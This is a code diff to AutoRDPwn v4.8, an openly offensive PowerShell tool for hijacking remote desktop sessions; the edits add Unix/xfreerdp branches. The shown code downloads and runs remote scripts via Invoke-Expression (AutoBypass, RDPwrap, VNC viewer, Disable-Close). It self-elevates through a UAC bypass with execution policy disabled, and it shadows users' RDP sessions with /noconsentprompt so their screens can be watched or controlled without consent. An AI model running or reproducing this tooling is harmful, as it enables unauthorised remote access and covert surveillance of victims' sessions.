@@ -1,8 +1,8 @@
 ﻿[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8") ; $OSVersion = [Environment]::OSVersion.Platform
-if($OSVersion -like 'Unix') { $null } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/AutoBypass.ps1')}
+if($OSVersion -like 'Win*'){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/AutoBypass.ps1')}
 $noadmin=$args[0] ; $nogui=$args[1] ; $lang=$args[2] ; $option=$args[4] ; $shadowoption=$args[6] ; $createuser=$args[8] ; if($args[1,2,3,4,5,6]){ if(!$args[7]) { Write-Host "Not enough parameters!" -ForegroundColor Red ; exit }}
 if($noadmin -like '-noadmin') { $null } else { if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Bypass-UAC "powershell.exe -sta -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" $args " ; exit }}
-if($OSVersion -like 'Unix') { $null } else { (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Design/AutoRDPwn.ico","$pwd\AutoRDPwn.ico") ; (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Design/Set-ConsoleIcon.ps1","$pwd\Set-ConsoleIcon.ps1") ; .\Set-ConsoleIcon.ps1 AutoRDPwn.ico ; del Set-ConsoleIcon.ps1,AutoRDPwn.ico
+if($OSVersion -like 'Win*'){ (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Design/AutoRDPwn.ico","$pwd\AutoRDPwn.ico") ; (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Design/Set-ConsoleIcon.ps1","$pwd\Set-ConsoleIcon.ps1") ; .\Set-ConsoleIcon.ps1 AutoRDPwn.ico ; del Set-ConsoleIcon.ps1,AutoRDPwn.ico
 $Host.UI.RawUI.BackgroundColor = 'Black' ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; $Host.PrivateData.ErrorForegroundColor = 'Red' ; $Host.PrivateData.WarningForegroundColor = 'Magenta' ; $Host.PrivateData.DebugForegroundColor = 'Yellow' ; $Host.PrivateData.VerboseForegroundColor = 'Green' ; $Host.PrivateData.ProgressForegroundColor = 'White' ; $Host.PrivateData.ProgressBackgroundColor = 'Blue' }
 $Host.UI.RawUI.WindowTitle = "AutoRDPwn - v4.8 - by @JoelGMSec" ; $ErrorActionPreference = "SilentlyContinue" ; Set-StrictMode -Off ; Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Design/Disable-Close.ps1')
 
@@ -517,9 +517,10 @@ function Remove-Exclusions {
         Write-Host ; Write-Host "$using:txt35" -ForegroundColor Blue ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; query session }
         $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Host "$txt36" -NoNewLine -ForegroundColor Gray ; $shadow = $Host.UI.ReadLine() ; if(!$nogui){
 	if($vncserver){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-VNCViewer.ps1')
+	if($OSVersion -like 'Unix'){ if(!$user){ xfreerdp /v:$computer /restricted-admin /u:$user /p:$password } else { xfreerdp /v:$computer /admin /u:$user /p:$password }} else {
 	if($control -eq 'true') { .\VNCViewer.exe /password AutoRDPwn $computer } if($control -eq 'false') { .\VNCViewer.exe /password AutoRDPwn /viewonly $computer }} else {
 	if($control -eq 'true') { if($stickykeys){ mstsc /v $computer /admin /f } elseif (!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
-        if($control -eq 'false') { if(!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}}}}
+        if($control -eq 'false') { if(!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}}}}}
 
         else { Write-Host "$version $txt37" -ForegroundColor Red ; if(!$vncserver){ invoke-command -session $RDP[0] -scriptblock {
         Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-RDPwrap.ps1')
@@ -530,9 +531,10 @@ function Remove-Exclusions {
 
         $shadow = invoke-command -session $RDP[0] -scriptblock { (Get-Process explorer).SessionId } ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; Write-Host ; Write-Host "$txt35" ; Start-Sleep -milliseconds 2500 ; if(!$nogui){
         if($vncserver){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-VNCViewer.ps1')
-        if($control -eq 'true') { .\VNCViewer.exe /password AutoRDPwn $computer } if($control -eq 'false') { .\VNCViewer.exe /password AutoRDPwn /viewonly $computer }} else {
+        if($OSVersion -like 'Unix'){ if(!$user){ xfreerdp /v:$computer /restricted-admin /u:$user /p:$password } else { xfreerdp /v:$computer /admin /u:$user /p:$password }} else {
+	if($control -eq 'true') { .\VNCViewer.exe /password AutoRDPwn $computer } if($control -eq 'false') { .\VNCViewer.exe /password AutoRDPwn /viewonly $computer }} else {
         if($control -eq 'true') { if($stickykeys){ mstsc /v $computer /admin /f } elseif (!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
-        if($control -eq 'false') { if(!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}}}}
+        if($control -eq 'false') { if(!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}}}}}
 
 $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
 if ($nogui){ $remotehost = $env:computername.tolower() ; Write-Host $txt66 -ForegroundColor Green ; Write-Host ; Write-Host "mstsc /v $remotehost /admin /shadow:$shadow /control /noconsentprompt /prompt /f" ; Write-Host
